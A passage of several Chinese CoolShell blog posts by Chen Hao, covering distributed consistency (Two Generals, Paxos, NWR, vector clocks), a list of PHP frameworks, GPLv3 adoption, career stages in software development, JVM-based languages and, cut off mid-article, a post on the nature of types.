**一个网络服务会有三种状态：1）Success，2）Failure，3）Timeout，第三个绝对是恶梦，尤其在你需要维护状态的时候** 。#### Two Generals Problem（两将军问题）Two Generals Problem 两将军问题是这么一个思维性实验问题： 有两支军队，它们分别有一位将军领导，现在准备攻击一座修筑了防御工事的城市。这两支军队都驻扎在那座城市的附近，分占一座山头。一道山谷把两座山分隔开来，并且两位将军唯一的通信方式就是派各自的信使来往于山谷两边。不幸的是，这个山谷已经被那座城市的保卫者占领，并且存在一种可能，那就是任何被派出的信使通过山谷是会被捕。 请注意，虽然两位将军已经就攻击那座城市达成共识，但在他们各自占领山头阵地之前，并没有就进攻时间达成共识。两位将军必须让自己的军队同时进攻城市才能取得成功。因此，他们必须互相沟通，以确定一个时间来攻击，并同意就在那时攻击。如果只有一个将军进行攻击，那么这将是一个灾难性的失败。 这个思维实验就包括考虑他们如何去做这件事情。下面是我们的思考：1）第一位将军先发送一段消息“让我们在上午9点开始进攻”。然而，一旦信使被派遣，他是否通过了山谷，第一位将军就不得而知了。任何一点的不确定性都会使得第一位将军攻击犹豫，因为如果第二位将军不能在同一时刻发动攻击，那座城市的驻军就会击退他的军队的进攻，导致他的军对被摧毁。
2）知道了这一点，第二位将军就需要发送一个确认回条：“我收到您的邮件，并会在9点的攻击。”但是，如果带着确认消息的信使被抓怎么办？所以第二位将军会犹豫自己的确认消息是否能到达。3）于是，似乎我们还要让第一位将军再发送一条确认消息——“我收到了你的确认”。然而，如果这位信使被抓怎么办呢？4）这样一来，是不是我们还要第二位将军发送一个“确认收到你的确认”的信息。靠，于是你会发现，这事情很快就发展成为不管发送多少个确认消息，都没有办法来保证两位将军有足够的自信自己的信使没有被敌军捕获。**这个问题是无解的** 。两个将军问题和它的无解证明首先由E.A.Akkoyunlu,K.Ekanadham和R.V.Huber于1975年在《一些限制与折衷的网络通信设计》一文中发表，就在这篇文章的第73页中一段描述两个黑帮之间的通信中被阐明。 1978年，在Jim Gray的《数据库操作系统注意事项》一书中（从第465页开始）被命名为两个将军悖论。作为两个将军问题的定义和无解性的证明的来源，这一参考被广泛提及。这个实验意在阐明：试图通过建立在一个不可靠的连接上的交流来协调一项行动的隐患和设计上的巨大挑战。从工程上来说，一个解决两个将军问题的实际方法是使用一个能够承受通信信道不可靠性的方案，并不试图去消除这个不可靠性，但要将不可靠性削减到一个可以接受的程度。比如，第一位将军排出了100位信使并预计他们都被捕的可能性很小。在这种情况下，不管第二位将军是否会攻击或者受到任何消息，第一位将军都会进行攻击。另外，第一位将军可以发送一个消息流，而第二位将军可以对其中的每一条消息发送一个确认消息，这样如果每条消息都被接收到，两位将军会感觉更好。然而我们可以从证明中看出，他们俩都不能肯定这个攻击是可以协调的。他们没有算法可用（比如，收到4条以上的消息就攻击）能够确保防止仅有一方攻击。再者，第一位将军还可以为每条消息编号，说这是1号，2号……直到n号。这种方法能让第二位将军知道通信信道到底有多可靠，并且返回合适的数量的消息来确保最后一条消息被接收到。如果信道是可靠的话，只要一条消息就行了，其余的就帮不上什么忙了。最后一条和第一条消息丢失的概率是相等的。
两将军问题可以扩展成更变态的 **拜占庭将军问题 (Byzantine Generals Problem)** ，其故事背景是这样的：拜占庭位于现在土耳其的伊斯坦布尔，是东罗马帝国的首都。由于当时拜占庭罗马帝国国土辽阔，为了防御目的，因此每个军队都分隔很远，将军与将军之间只能靠信差传消息。 在战争的时候，拜占庭军队内所有将军必需达成一致的共识，决定是否有赢的机会才去攻打敌人的阵营。但是，军队可能有叛徒和敌军间谍，这些叛徒将军们会扰乱或左右决策的过程。这时候，在已知有成员谋反的情况下，其余忠诚的将军在不受叛徒的影响下如何达成一致的协议，这就是拜占庭将军问题。#### Paxos算法Wikipedia上的各种Paxos算法)的描述非常详细，大家可以去围观一下。Paxos 算法解决的问题是在一个可能发生上述异常的分布式系统中如何就某个值达成一致，保证不论发生以上任何异常，都不会破坏决议的一致性。一个典型的场景是，在一个分布式数据库系统中，如果各节点的初始状态一致，每个节点都执行相同的操作序列，那么他们最后能得到一个一致的状态。为保证每个节点执行相同的命令序列，需要在每一条指令上执行一个「一致性算法」以保证每个节点看到的指令一致。一个通用的一致性算法可以应用在许多场景中，是分布式计算中的重要问题。从20世纪80年代起对于一致性算法的研究就没有停止过。
**Notes** ：Paxos算法是莱斯利·兰伯特（Leslie Lamport，就是 LaTeX 中的”La”，此人现在在微软研究院）于1990年提出的一种基于消息传递的一致性算法。由于算法难以理解起初并没有引起人们的重视，使Lamport在八年后1998年重新发表到ACM Transactions on Computer Systems上（The Part-Time Parliament）。即便如此paxos算法还是没有得到重视，2001年Lamport 觉得同行无法接受他的幽默感，于是用容易接受的方法重新表述了一遍（Paxos Made Simple）。可见Lamport对Paxos算法情有独钟。近几年Paxos算法的普遍使用也证明它在分布式一致性算法中的重要地位。2006年Google的三篇论文初现“云”的端倪，其中的Chubby Lock服务使用Paxos作为Chubby Cell中的一致性算法，Paxos的人气从此一路狂飙。（Lamport 本人在 他的blog 中描写了他用9年时间发表这个算法的前前后后）注：Amazon的AWS中，所有的云服务都基于一个ALF（Async Lock Framework）的框架实现的，这个ALF用的就是Paxos算法。我在Amazon的时候，看内部的分享视频时，设计者在内部的Principle Talk里说他参考了ZooKeeper的方法，但他用了另一种比ZooKeeper更易读的方式实现了这个算法。
简单说来，Paxos的目的是让整个集群的结点对某个值的变更达成一致。Paxos算法基本上来说是个民主选举的算法——大多数的决定会成个整个集群的统一决定。任何一个点都可以提出要修改某个数据的提案，是否通过这个提案取决于这个集群中是否有超过半数的结点同意（所以Paxos算法需要集群中的结点是单数）。这个算法有两个阶段（假设这个有三个结点：A，B，C）：**第一阶段：Prepare阶段**A把申请修改的请求Prepare Request发给所有的结点A，B，C。注意，Paxos算法会有一个Sequence Number（你可以认为是一个提案号，这个数不断递增，而且是唯一的，也就是说A和B不可能有相同的提案号），这个提案号会和修改请求一同发出，任何结点在“Prepare阶段”时都会拒绝其值小于当前提案号的请求。所以，结点A在向所有结点申请修改请求的时候，需要带一个提案号，越新的提案，这个提案号就越是是最大的。如果接收结点收到的提案号n大于其它结点发过来的提案号，这个结点会回应Yes（本结点上最新的被批准提案号），并保证不接收其它<n的提案。这样一来，结点上在Prepare阶段里总是会对最新的提案做承诺。
优化：在上述 prepare 过程中，如果任何一个结点发现存在一个更高编号的提案，则需要通知 提案人，提醒其中断这次提案。**第二阶段：Accept阶段**如果提案者A收到了超过半数的结点返回的Yes，然后他就会向所有的结点发布Accept Request（同样，需要带上提案号n），如果没有超过半数的话，那就返回失败。当结点们收到了Accept Request后，如果对于接收的结点来说，n是最大的了，那么，它就会修改这个值，如果发现自己有一个更大的提案号，那么，结点就会拒绝修改。我们可以看以，这似乎就是一个“两段提交”的优化。其实， **2PC/3PC都是分布式一致性算法的残次版本，Google Chubby的作者Mike Burrows说过这个世界上只有一种一致性算法，那就是Paxos，其它的算法都是残次品。******我们还可以看到：对于同一个值的在不同结点的修改提案就算是在接收方被乱序收到也是没有问题的。关于一些实例，你可以看一下Wikipedia中文中的“Paxos样例”一节，我在这里就不再多说了。对于Paxos算法中的一些异常示例，大家可以自己推导一下。你会发现基本上来说只要保证有半数以上的结点存活，就没有什么问题。
多说一下，自从Lamport在1998年发表Paxos算法后，对Paxos的各种改进工作就从未停止，其中动作最大的莫过于2005年发表的Fast Paxos。无论何种改进，其重点依然是在消息延迟与性能、吞吐量之间作出各种权衡。为了容易地从概念上区分二者，称前者Classic Paxos，改进后的后者为Fast Paxos。#### 总结下图来自：Google App Engine的co-founder Ryan Barrett在2009年的google i/o上的演讲《Transaction Across DataCenter》（视频： http://www.youtube.com/watch?v=srOgpXECblk）前面，我们说过，要想让数据有高可用性，就需要冗余数据写多份。写多份的问题会带来一致性的问题，而一致性的问题又会带来性能问题。从上图我们可以看到，我们基本上来说不可以让所有的项都绿起来，这就是著名的CAP理论：一致性，可用性，分区容忍性，你只可能要其中的两个。#### NWR模型**最后我还想提一下Amazon Dynamo的NWR模型。这个NWR模型把CAP的选择权交给了用户，让用户自己的选择你的CAP中的哪两个** 。
所谓NWR模型。N代表N个备份，W代表要写入至少W份才认为成功，R表示至少读取R个备份。 **配置的时候要求W+R > N**。 因为W+R > N， 所以 R > N-W 这个是什么意思呢？就是读取的份数一定要比总备份数减去确保写成功的倍数的差值要大。也就是说，每次读取，都至少读取到一个最新的版本。从而不会读到一份旧数据。当我们需要高可写的环境的时候，我们可以配置W = 1 如果N=3 那么R = 3。 这个时候只要写任何节点成功就认为成功，但是读的时候必须从所有的节点都读出数据。如果我们要求读的高效率，我们可以配置 W=N R=1。这个时候任何一个节点读成功就认为成功，但是写的时候必须写所有三个节点成功才认为成功。NWR模型的一些设置会造成脏数据的问题，因为这很明显不是像Paxos一样是一个强一致的东西，所以，可能每次的读写操作都不在同一个结点上，于是会出现一些结点上的数据并不是最新版本，但却进行了最新的操作。所以，Amazon Dynamo引了数据版本的设计。也就是说，如果你读出来数据的版本是v1，当你计算完成后要回填数据后，却发现数据的版本号已经被人更新成了v2，那么服务器就会拒绝你。版本这个事就像“乐观锁”一样。
但是，对于分布式和NWR模型来说，版本也会有恶梦的时候——就是版本冲的问题，比如：我们设置了N=3 W=1，如果A结点上接受了一个值，版本由v1 -> v2，但还没有来得及同步到结点B上（异步的，应该W=1，写一份就算成功），B结点上还是v1版本，此时，B结点接到写请求，按道理来说，他需要拒绝掉，但是他一方面并不知道别的结点已经被更新到v2，另一方面他也无法拒绝，因为W=1，所以写一分就成功了。于是，出现了严重的版本冲突。Amazon的Dynamo把版本冲突这个问题巧妙地回避掉了——版本冲这个事交给用户自己来处理。于是，Dynamo引入了Vector Clock（矢量钟？!）这个设计。这个设计让每个结点各自记录自己的版本信息，也就是说，对于同一个数据，需要记录两个事：1）谁更新的我，2）我的版本号是什么。下面，我们来看一个操作序列：1）一个写请求，第一次被节点A处理了。节点A会增加一个版本信息(A，1)。我们把这个时候的数据记做D1(A，1)。 然后另外一个对同样key的请求还是被A处理了于是有D2(A，2)。这个时候，D2是可以覆盖D1的，不会有冲突产生。2）现在我们假设D2传播到了所有节点(B和C)，B和C收到的数据不是从客户产生的，而是别人复制给他们的，所以他们不产生新的版本信息，所以现在B和C所持有的数据还是D2(A，2)。于是A，B，C上的数据及其版本号都是一样的。
3）如果我们有一个新的写请求到了B结点上，于是B结点生成数据D3(A,2; B,1)，意思是：数据D全局版本号为3，A升了两新，B升了一次。这不就是所谓的代码版本的log么？4）如果D3没有传播到C的时候又一个请求被C处理了，于是，以C结点上的数据是D4(A,2; C,1)。5）好，最精彩的事情来了：如果这个时候来了一个读请求，我们要记得，我们的W=1 那么R=N=3，所以R会从所有三个节点上读，此时，他会读到三个版本：* A结点：D2(A,2)     * B结点：D3(A,2; B,1);     * C结点：D4(A,2; C,1)6）这个时候可以判断出，D2已经是旧版本（已经包含在D3/D4中），可以舍弃。7）但是D3和D4是明显的版本冲突。于是，交给调用方自己去做版本冲突处理。就像源代码版本管理一样。很明显，上述的Dynamo的配置用的是CAP里的A和P。我非常推大家都去看看这篇论文：《Dynamo：Amazon’s Highly Available Key-Value Store》，如果英文痛苦，你可以看看译文（译者不详）。（全文完）# 22个开源的PHP框架作者：陈皓，左耳朵耗子
来自：酷壳网 CoolShell https://coolshell.cnPHP 是一个被广泛使用的来进行Web开发的脚本语言。虽然有很多其它可供选择的Web开发语言，像：ASP 和Ruby，但是PHP是目前为止世界上最为流行的。那么，是什么让PHP如此流行？PHP 如此之流行是因为比起别的语言来，它更容易学习，网上有一大堆相当相当不错的PHP教程可以让你快速地马上就可以进行Web程序的开发。虽然PHP是是简单的，而且是容易上手的，但用它编程还是有点麻烦，尤其是一些反复在用的功能。不过，幸运的是，很多开发团队早就注意到了这点，现在在网上，PHP有许多的可以信任的PHP Framework 可以缩短我们的开发时间。这些框架被一个巨大的社区所支持，因些，如果你有什么问题的话，一定会有人乐意帮你去解决。废话少说，让我们来看看这22个PHP的框架。## 迄今最有前途的框架### 1\. Zend Framework!zend-framework   Zend Framework 是一个面向对象的，由PHP5写成的框架。其基于一个简洁和友好的许可证协议，并基于了一个经过了相当严酷测试的代码库开发而来。这是一个松散的几乎没有耦合架构设计，你可以方便地把其和其它框架混合使用。
### 2\. Symfony!symfony   Symfony 是一个基于PHP 5 的框架，其提供了一个架构，组件和工具集，可以让你更快地创造你的应用。在其官网上提供了一些入门教程。### 3\. CodeIgniter!codeigniter   CodeIgniter 这个框架有一个wiki可以让你容易的查找相关的文档。其支持的是PHP4。### 4\. CakePHP!cakephp   这个框架使用了一些流行的设计模式比如： MVC 和ORM ， CakePHP 可以有效地减少开发成本和帮助开发人员少写代码。### 5\. Prado!pradoPrado 需要PHP5 及以上版本才能运行，这是基于组件和事件驱动编程的一个程序框架。### 6\. Kohana!kohana   Kohana 是一个基于 PHP 5 的框架，其也是使用MVC—— Model View Controller 架构模式。其面对的是安全，轻量级，和易用性。由于Kohana 原来基于 CodeIgniter开发，因为其限制了PHP5 的OOP能力，所以这个框架更合适用在一些中小型的应用。### 7\. Solar Framework
!solar   Solar 是一个 PHP 5 的框架，其可以用做企业级的应用，而且有内建的语言集和配置。### 8\. Fuse!fuse   FUSE 也是一个MVC的PHP框架。其注是要受到了Ruby on Rails 和CakePHP的影响，其有定制和直接的设计。FUSE 是一个功能完整，相当稳定的使用面向对像开发的MVC框架。### 9\. Yii PHP Framework!yii   Yii 是一个高性能的组件式的PHP框架，对于那些大型的Web应用来说，这是最好的框架，全面的功能。但需要PHP5及以上版的支持。### 10\. Akelos PHP Framework!akelos   Akelos PHP 框架也是基于 MVC (Model View Controller) 设计模式的框架。## 其它可选的 PHP 框架11\. Recess   12\. Agavi   13\. Qcodo   14\. Zoop   15\. QPHP   16\. Seagull PHP   17\. PHPDevShell   18\. PHPOpenBiz   19\. WASP   20\. evoCore   21\. Lion   22\. Flow3
文章：来源# GPLv3的在开源社区中的占有量作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn2007年7月，GPLv3 发布，当时有164个项目加入，一年后，有大约两千个项目使用GPLv3协议，今天，Google开源programs office manager Chris DiBona向大家 宣布 在Google 开源项目中，使用GPLv3的项目至少有 56,000个。当然，这只是计算了在 Google Code 中的项目。对于今天有 225,000 项目的 Google Code，这四分之一的 GPLv3 也是一个不小的数目了。如果我们假设Sourceforge.net 和 Codehaus 也有和Google Code相似的 GPLv3 比率的话，那么，今天使用 GPLv3 的项目将是一个很大的数量。这个数据是有意义的，尤其对于那些还在激活的项目，因为Google Code上的活跃的项目比Sourceforge要高得多，在Sourceforge上，估计只有12%的项目还处理激活状态（剩下的88%都是处理长期没有更新，当然也就一直在使用老版本的协议）。虽然和GPLv2比起，GPLv3还很少，但数量已经很大了。
以前写过一篇关于GPLv3的文章《GPLv3：大教堂和集市的新一轮对抗》，有兴趣的读者不妨一读。下面是开源license的一个比例（时间：2009年7月），仅供参考：!GPL（全文完）# 软件开发的“三重门”作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn自从上次写了“程序员技术练级攻略” 以来，就觉得似乎还有很多东西没有谈到，但当时没有继续思考了。而春节前有人问我，是做底层技术，还是做业务。这问题让我思考了很多，不由自主地回顾了一 下我这十多年的软件开发经历，并顺着整理分类了一下自己解决过的若干问题，还发散想了很多，经过了一个春节假期的发酵，产生了下面这篇文章。目录* 前言   * 一重门：业务功能   * 二重门：业务性能   * 三重门：业务智能   * 后记#### 前言这篇文章必然是通过我的个人经历来写的。所以，我先说说个人经历吧。我的经历基本分成三个阶段。**第一阶段：** 我 刚毕业时在家乡的某银行工作，做些银行的业务系统，还搞些网络，电子邮件系统，OA什么的，因为大四的时候在老师的公司里实习，银行里的人际关系太复杂， 而且技术都包给了产商，所以在银行的每一天都觉得不能适应里面的工作环境。两年后离职，单位分的房也不要了，直接去了上海，在上海呆了两年，本来想做互联 网的，但是泡沫来了，最终去了一家做系统集成的国企公司还是继续做银行业务。这四年来，主要解决的都是一些业务上的问题，银行里的会计业务，OA业务，国 际业务，中间对公业务都非常地复杂，而且因为当时的软件开发相当的不规范，所以基本上是在一种比较混乱的状态下度过的，而银行方面又很强势，所以，这段时 间主要是做业务。所以，技术上主要是积累了如何使用那些技术。C+/Java， Windows编程，Unix编程，网络编程主要是这段时间学的，看了太多的书（我大学课程里没有C++和Java，也没有Windows/Unix和网 络编程，所以，只能拼命地看书和自学）。
**第二阶段：** 然后，我来了北京，到了一家做分布式计算系统的公 司，整天和一个高性能技术高可用性的企业级的集群式的软件产品打交道（这家公司去年被IBM收购了），在这家公司把Windows/Unix和网络编程有 了更深入的了解，对我长进比较大的是明白了怎么做一个性能高，可用性高的集群式的系统，天天和底层打交道，干了4年多。然后去了一家金融信息公司，这家金 融公司主要做全球的金融信息数据处理，而我主要还是做核心数据发布系统的性能调优的项目，金融数据的实时性要求的高，数据量非常地大，高可用性要求得高， 得想尽一切办法省网络带宽，增加系统性能，还要保持高的可用性，不当机，不丢包。又干了4年多，入职的时候从国外接过来两个系统，其性能单机每秒可处理 120K message，我走的时候，我和团队把其优化到了每秒1.4M messages 的吞吐，另一个系统，从接手时的100k message/s优化到了500k message/s。这八年多的时候，全是在和这些高计算高性能的项目打交量，几乎没有什么业务，都是纯技术，积累到了很多和性能有关的高并发高计算系统 架构级的知识。**第三阶段：** 两 年前来到了现在的做电子商务的互联网公司，还是在做一个数据处理量很大的业务系统，因为要干的是要把电子商务全球化的东西。但是，因为电子商 务的特殊性，必需要去兼顾业务的特点，而且在这家电商公司，耳读目染了很多有趣的业务难题，比如，库存计划，配送优化，等等。虽然很多东西还不明白，但发 现，用技术来解决业务难题真是太有意思了。
我的这三个阶段，第一个阶段花了4年，第二个阶段花了8年，第三阶段刚刚开始2年不到，有时候我也去别的公司讲课，所以，我很有幸经历了中国软件开发的进化过程。 **我的经历可以说是中国软件行业进程的一个缩影，而我把这三个阶段称为** —— **软件开发的三重门** 。它们分别是：* **业务功能 –** 粗放地开垦 **   *** **业务性能 –** 扩大化生产 **   *** **业务智能 –** 精耕细作 **   **之所以加上“业务”二字，是因为我以为计算机是一个工具，其用来解决实际问题，所以，什么都离不开业务，就算是性能优化也一样，通过之前那篇“12306.cn的性能优化”中的“业务分析”段落，我们可以知道业务的不同，系统的难度和解决方法就可以不同。所以，我们总是用技术在解决业务问题。 **业务的形态对软件的开发有决定性的作用** 。下面让我具体描述一下。#### 一重门：业务功能这 是软件开发的第一重门，也就是掌握可以实现业务功能的技术。通常分成三块：语言+系统+数据处理。在这个阶段，主要是能掌握各种技术，比如：开发用的各种 工具（如：IDE，XUnit，Debugger，等），各种代码库和框架（如：C++的STL，ACE，Boost，等，Java的 Spring，Hibernate等），各种系统知识（如：Windows API，Unix/Linux API，TCP/IP，Socket，多线程多进程间的同步、互斥，并发安全，还包括Web平台，移动平台，等等），还需要掌握数据处理的知识（如：数据 结构，基本算法，数据库设计，数据库引擎 ，SQL等），等等……
这个阶段主要是把这些不同的技术组织成可以实现业务功能的解决方案。重点是能掌握和使用技术。很多流程和方法论的东西基本上就在这一重门里。 **这重门主要解决的是业务实现问题** 。#### 二重门：业务性能业务的功能搞定了以后，就是业务的性能问题了。搞定功能并不难，搞定性能是有点技术含量的事。有句话不是那么说的吗—— **每个人都可以搞一个网站出来，但不是每个人都能搞出能支持百万级访问量的网站** 。但是，我看到很多技术团队或是工程师脱离了业务，只单纯地搞性能，比如：单台服务器支持10万个TCP链接的并发，等等。这些东西虽然在技术上有点意思，但是没有业务的环境，也只能是自娱自乐了。我们可以看到一些企业开始注重这个问题了，性能问题也是最近被大家讨论得最多的问题，京东商场的性能问题，12306的性能问题，等等。当然， **所谓性能不并单单指系统的吞吐力，还指系统运行时的总体性能** ，比如，系统安全性能，易用性能，系统的Accessbility的性能，系统的扩展性性能，等等，就像是前段时间“Web开发中需要注意的问题”一文中谈到的那些事一样。这表明着你对系统的全面和深入的了解。在 这个阶段，需要对业务模型，数据流，业务流，系统架构，算法，和各种技术有深入的了解，要了解到本质上来。比如，在第一重门中，我们只需同要知 道，Java有同步关键字，在这一重门中，我们还要知道同步或互斥对性能的巨大伤害性，在第一重门中，我们只需要知道STL中的智能指针或是STL的用 法，这一重门中，我们还要知道智能指针中的refcnt的同步加锁对性能的损害，还需要知道STL中容器的size()方法在某些时候是性能很差的。在第 一重门中，我们需要知道hash表的效率，在这一重门中，我们还需要知道hash表的碰撞问题。
最重要的是， **在这重门重点是软件的设计问题** 。你需要有足够多的经验能比较不同设计方案的优缺点，比如TCP和UDP，同步和异步，epoll和select，push和pull，水平扩展的各种方案…… 还记得本站的那篇“程序员的谎谬之言还是至理名言”，广度是你深度的副产品。所以，这重门是看你的技术视野有多深有多广。#### 三重门：业务智能这 重门可能是最难的一重门了，如果你能进到这重门里，你应该是科学家级的程序员了。让你有智能的业务，这个事可能是顶级的技术难题了。第一和第二重门都不算 难，这重门是最难的。参看Amazon的个性化推荐系统，或是Google搜索引擎的结果个性化推荐等等（比如我输入“黑天鹅”关键字，你怎么知道我要找 的是动物，电影，音乐，还是本书？怎么让搜索出来的结果排名即公正又可个性？），你就知道，用技术来解决这种类似的问题难度可想而知，不然就不会出现如 Hadoop之类的技术了。我再举两个这重门里的业务方面的例子。* 一个例子是关于库存计划的，需要像天气预报一样 预测未来的销售量从而决定库存，所以，最简单的做法是，监测各个商品的销售统计，然后看一下最近的销售趋势，还要看一下往年的销售趋势（因为某些节假日会 是一个高峰期），还要分析一下大众的喜好变化，比如，在某影评网站上的某电影的热度其会告诉我哪个电影的DVD要滞销了，得打折卖，哪个电影的DVD要畅 销了，得多进货了。还可能需要监控新闻评论，比如某权威人士推荐了某个商品，那么我得赶快进货了。等等。这完全就是一门科学。
* 还有一个例子是配送问题。我有一辆卡车要处理我仓库和配送站间的物流问题，我需要找到一条最经济的路线来在有限的时间内处理最多的物流。这个不是最短路径问题，这是个计划统筹学的东西。也是一门科学。还有近期“方韩之争”里有很多人来分析文章相似度的技术，这些东西都属于三重门里的东西。到了这重门里，可能技术反而不是重要的了，而是数学模型。 **这重门里主要是业务模型，数据模型和算法问题** 。这些东西和你的业务模型密切相关。能解决这样的问题，是真正的大牛。对于我来说，可能是高山仰止了。#### 后记通过上面的说明，我们可以看到下面这些东西，* 我的那篇“程序员技术练级攻略”里的东西只能让我们最多达到1.1 到 1.2重门。* 一重门像是开垦荒地，二重门像是扩大生产，三重门像是精耕细作。* 一重门（业务实现）里聚集着大量的劳动密集型的企业，劳动密集型的企业通常都需要流程和方法论。敏捷过程改进这类的东西只在一重门里。* 二重门和三重门里只有少数不多的技术型的公司。这类的公司通常非常注重技术，并且是企业文化是工程师的文化。* 三重门里可以产生的创新和那些可以用来改变世界的技术。* 国内现在的情况是，一重门优化阶段 + 二重门的学习阶段。三重门里似乎还没有什么见术。不过，我看到一些公司已在尝试三重门的东西了。
* 作为技术人员的你，如果你想跟上时代，让自己有价值的话，你至少要达到二重门。* 因 为国内的技术环境等不良因素，导致大量的程序员在一重门的时候就已经失去信心，或被大浪淘沙淘掉了，所以，二重门里的程序员比较少了，但是随着年轻的一代 和技术的日趋成熟，也会慢慢多起来的，我现在已经看到这个趋势了。而三重门里的程序员成了稀缺的大熊猫。因为大量的二重门程序员干到那个时候都转管理了。**我的这些言论不一定对，但希望能让大家有启发，有所思考。****注** ：本来这篇文章的标题想取成“ **程序员要解决的三种问题** ”， 但是因为过年都在关注 “方韩之争”，所以，干脆取成了这个名字。你可以认为我比较调皮，也可以认为我爱ZB，还可以认为我标题党，反正，请随意理解。（这篇文章是我的自己写 的，没有代笔，因为你一定会在这篇文章中看到属于我的用五笔打出来的错别字，当然，我无法自证，哈哈）（ **转载时请注明作者和出处，请勿用于商业用途** ）# 基于JVM的语言正在开始流行作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn**总结：**这是 Reuven Lerner在去年写的一篇博文，文章主要介绍了一些新兴的基于JVM的脚本语言。结合本文可以对Bruce的博文《C++和JAVA传统中积极的一面》有一个很好的理解。译者认为：语言始终都是一门工具，软件设计最重要的东西是来自于设计者的创造性，但是随着Java语言的出现，他的半动态的特性，ClassLoader，反射，动态代理，都是提高开发者创造性的前提，正是因为这些特性，才会出现新的的编程模式和范式——反转控制和依赖注入，面向方面的编程(AOP)。试想如果Java不提供ClassLoader，反射，动态代理机制的API，如何能实现依赖查找和依赖注入和动态AOP? 你能用C++来反转控制，依赖查找吗，能对容器中的组件做进行生命周期管理吗？为了说明程序员创造性和语言的这个关系，我引用Dion Hinchcliffe博文中的一张图来说明：
!程序员创造性和性能的关系原文：   **基于JVM的语言正在开始流行**当Sun Microsystems公司在1995年第一次揭开Java的面纱的时候，就是非常难被定义的。这是因为JAVA是由多个部分构成：首先，它当然是一个面向对象语言。同时JAVA也是一个定义标准的语言(或多个标准，包括移动设备，标准，和企业三个版本)。最后，Java是一个虚拟机(“JVM”)，一个Java程序能够执行的软件环境。如果你有一个JVM，虽然这个JVM只能用来运行Java的程序——但是，JVM能在运行在你能想到的每一个平台之上，这使得Java成为一个具有高移植性的语言。在Java世界的一个令人着迷的趋势就是：在最近的几年里使用JVM来运行非Java的程序在程增长的趋势。毕竟，如果创造了一门新的语言，你就必须在特定的平台上实现它。如果你想你的语言能在不同的平台上移植，那么你就需要为每一个平台实现一个版本。但是，相比而言，如果你将语言实现在JVM上，那么你就能让你的语言运行在任何系统的JVM上，这就意味着几乎所有平台都可以运行。于是现在就有了许多的基于JVM的新增语言。其中4个最流行的是发布在开源许可证之下的。考虑到如今Java也是开发源码了，这意味着你可以使用一个全开源体系，并且这个体系是可以移植的。因为这些语言都在JVM之上实现的，所以你就可以同时访问Java的标准库。这意味着如果有一个第三方的的Java库，而且你精于Python，那么你就可以使用Jython在你的源代码中访问这些Java库。
早期的基于JVM的脚本语言，就我所知，是Jython,之前被称为JPython。Jython，从名字你就可以猜到，是一个基于JVM的Python语言实现。Jython完全兼容Python2.2的标准版本(这个标准版本的Python也被称为CPython)，这意味着Jython将会没有Python的一些新特性。最近发布的Jython版本是2007年月发布的，但是Sun雇佣了两位早期Jython非常知名的开发者，并且现在Jython可以运行Django应用程序框架，因此验证其兼容Python的能力Sun公司同时资助了JRuby的开发，一个基于JVM的Ruby版本。Jython是Python唯一的两个实现的其中之一，对比而言，JRuby则是众多Ruby语言实现的其中之一。然而,JRuby被广泛的认为是一个非常重要的版本。特别是因为他的效率，和高度兼容标准C的Ruby版本实现。JRuby同样可以运行Ruby on Rails框架( **译者注：构建在Ruby之上的WEB应用框架** )，此外还能运行其他众多的功能。Jython和JRuby都是从其他已存在的语言中移植到JVM中来的。而全新的基于JVM的脚本语言是Groovy和Scala。这两门语言现在都越来越流行，不同的是，Groovy是动态脚本语言，而是Scala是静态语言。使用Groovy最著名的应用是Groovy on Grails项目，一个用Groovy写成，运行在JVM之上的WEB应用框架(和Ruby on Rails很相似)。Grails找到通向商业应用程序的道路，最著名的就是LinkedIn,使用Linkedin，开发人员发现他们能比直接使用Java更快速和容易的开发程序。相比而言，Scala，而是强类型是语言，Steve Yegge最近的一次访谈中曾经谈到、静态语言和动态语言的争论，因为这个他还受到了很多的批评（ **译者注：关于Steve Yegge的这篇关于动态语言和静态语言之争可以查看** **这里**, **Steve Yegge是一个动态语言的支持者** ）   Java已经被公认为是非常成功而流行的语言。现在，Java也同时也被认为是非常流行的平台，这四类语言仅仅是在不远的将来通过JVM来实现的新兴语言的开始
*[W3C]: World Wide Web Consortium   *[VML]: Vector Markup Language# 超强的验证码作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn大家看看这个网站吧。最强的验证码——把看到的东西画出来。某些网友们还是做了一些尝试：# 类型的本质和函数式实现作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn**（感谢**@文艺复兴记 **（todd） 投递此文）**在上一篇文章《二叉树迭代器算法》中，我介绍了一种基于栈的二叉树迭代器实现。程序设计语言和Haskell大牛@九瓜 在看过之后评论到：> 这里用了 stack 来做，有点偷懒，所以错失了一个抽象思考机会。如果我们能够理解二叉树到线性表的转换过程，完全可以把 Iterator > 当作抽象的线性表来看，只要定义了关于 Iterator 的 empty, singleton, 还有 append 操作，实现二叉树的 Iterator > 就变得非常直观。“错失了一个抽象思考机会”是什么意思呢？我理解九瓜的意思是基于栈的实现虽然是正确的，但它缺乏对于迭代器类型本质的理解，不具有通用性。如果能对迭代器进行合适地抽象就可以像二叉树递归遍历一样自然地得出二叉树迭代器，甚至其他更复杂的数据结构，只要我们能写出它的遍历算法，迭代器算法都可以自然推出。
目录* 类型的本质   * 类型的函数式实现   * 函数式二叉树迭代器   * 总结#### 类型的本质九瓜提到了通过empty, singleton和append操作对Iterator进行抽象，我本来打算直接根据这个思路介绍函数式的二叉树迭代器实现，但是考虑到其实首要的问题在于理解类型的本质，而并不是所有人都具备这个基础，不如先普及一下类型基础再进入具体实现。那么下面我们就先来认识一下类型到底是什么？我们先以来看看表示元素对的Pair类型，可能有人一提到Pair类型马上就会在脑海中浮现出下面的结构：其实，这种理解是非本质的，Pair完全可以用2个元素的数组来表示，第一个元素表示left，第二个元素表示right：上面的两种不同表示是类型的不同实现，而 **类型的本质是由操作(Operation)和操作间的关系或不变式(Invariant)所定义的** ，我们称之为类型规范(Type Specification)。比如，Pair类型是这样定义的：Type Pair:     Operations:     Pair make_pair(int x, int y)     int get_left(Pair pair)     int get_right(Pair pair)     Invariants:     get_left(make_pair(x, y)) == x  //对x, y构造的Pair取左元素等于x     get_right(make_pair(x, y)) == y  //对x, y构造的Pair取右元素等于y
